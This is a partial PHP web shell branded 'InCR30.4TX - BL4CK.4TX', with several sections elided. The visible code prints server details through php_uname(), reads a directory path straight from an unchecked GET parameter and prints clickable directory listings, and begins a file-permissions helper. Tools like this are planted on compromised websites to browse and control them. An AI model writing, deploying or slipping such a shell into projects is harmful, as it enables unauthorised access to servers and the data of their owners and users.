...
body {
  ...
  background:    #040C40;line-height: 1;color: #fff;font-family: Comic Sans MS ;
...
<br>
<br>
<title>[ InCR30.4TX - BL4CK.4TX ]</title>
<link rel="icon" type="image/x-icon" href="https://2.top4top.net/p_1315bbkqd0.png">
<center><img src="https://2.top4top.net/p_1315bbkqd0.png" width="320" height="300">
<br>
<font size="3" class="Ardyan"> <i><b>[ Developed By InCR30.4TX ]</b></i></font>
<br>
<br>
<font color="#81FF90"><center>'.php_uname().'</center></font><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#85E80C><center>$ Directory : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<br><center><font color="white"><b><i>&copy;BL4CK.4TX</body>
<br>
</html>';
function perms($file){
